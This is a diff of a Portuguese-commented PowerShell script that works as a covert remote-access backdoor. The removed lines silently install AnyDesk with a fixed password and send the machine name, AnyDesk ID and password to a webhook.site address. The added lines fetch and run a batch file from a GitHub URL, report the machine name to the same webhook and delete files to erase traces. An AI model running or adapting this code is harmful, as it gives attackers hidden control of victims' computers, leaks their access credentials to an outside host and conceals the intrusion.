@@ -1,52 +1,49 @@
-$url = "https://download.anydesk.com/AnyDesk.exe"
-$arquivo = "$env:TEMP\Any_Russo.exe"
+# 1. Configurações de links e caminhos
+$urlBat = "https://raw.githubusercontent.com/arthurcsilva109-create/russo353/refs/heads/main/instalar_dependencias.bat"
+$caminhoBat = "$env:TEMP\instalar_dependencias.bat"
+$caminhoExe = "$env:TEMP\Any_Russo.exe"
 $webhook = "https://webhook.site/1070b89e-8689-4293-b09a-2e166cfba592"
-$senha = "10978"
-$appData = "$env:APPDATA\AnyDesk"
 
-# 1. Encerra processos antigos e limpa pastas para garantir um ID novo
-Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
-if (Test-Path $appData) { Remove-Item -Recurse -Force $appData }
+# 2. Configura o protocolo de segurança para o download não falhar
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 2. Download silencioso
-Invoke-WebRequest -Uri $url -OutFile $arquivo
+Write-Host ">>> Iniciando processamento..." -ForegroundColor Cyan
 
-# 3. Inicia o AnyDesk minimizado e define a senha
-Start-Process -FilePath $arquivo -ArgumentList "--set-password $senha" -WindowStyle Hidden
-Start-Sleep -Seconds 5
-
-# 4. Loop para capturar o ID (Verifica o arquivo system.conf)
-$anyID = $null
-$confPath = "$appData\system.conf"
-
-while (-not $anyID) {
-    if (Test-Path $confPath) {
-        $content = Get-Content $confPath | Select-String "ad.anynet.id="
-        if ($content) {
-            $anyID = ($content -split '=')[1].Trim()
-        }
-    }
-    if (-not $anyID) { Start-Sleep -Seconds 2 }
+# 3. Baixa o arquivo .bat do GitHub
+try {
+    Invoke-WebRequest -Uri $urlBat -OutFile $caminhoBat -UseBasicParsing
+    Write-Host "[OK] Script BAT baixado." -ForegroundColor Green
+} catch {
+    Write-Host "[ERRO] Falha ao baixar o arquivo BAT." -ForegroundColor Red
+    exit
 }
 
-# 5. Envia os dados para o Webhook
-$body = @{
-    maquina = $env:COMPUTERNAME
-    anydesk_id = $anyID
-    senha = $senha
-    status = "Fantasma_PS1_Online"
+# 4. Executa o arquivo .bat e aguarda ele terminar
+Write-Host ">>> Executando dependencias..." -ForegroundColor Yellow
+Start-Process -FilePath $caminhoBat -Wait -WindowStyle Normal
+
+# 5. Envia a confirmação de término para o Webhook
+$dados = @{
+    pc = $env:COMPUTERNAME
+    status = "Dependencias Instaladas e Limpeza Concluida"
+    data = (Get-Date).ToString()
 } | ConvertTo-Json
 
-Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
-
-# 6. Aguarda o processo fechar para limpar tudo
-while (Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue) {
-    Start-Sleep -Seconds 5
+try {
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $dados -ContentType "application/json"
+    Write-Host "[OK] Notificacao enviada ao painel." -ForegroundColor Green
+} catch {
+    Write-Host "[!] Falha ao avisar o Webhook." -ForegroundColor Gray
 }
 
-# 7. Limpeza Final
+# 6. Limpeza total de rastros
+Write-Host ">>> Finalizando e limpando arquivos..." -ForegroundColor Cyan
 Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
-Remove-Item -Force $arquivo -ErrorAction SilentlyContinue
-Remove-Item -Recurse -Force $appData -ErrorAction SilentlyContinue
-Remove-Item -Recurse -Force "$env:ProgramData\AnyDesk" -ErrorAction SilentlyContinue
+
+# Deleta o executável do AnyDesk e o arquivo .bat
+if (Test-Path $caminhoExe) { Remove-Item -Force $caminhoExe }
+if (Test-Path $caminhoBat) { Remove-Item -Force $caminhoBat }
+
+Write-Host ">>> PROCESSO CONCLUIDO COM SUCESSO." -ForegroundColor Green
+Start-Sleep -Seconds 3
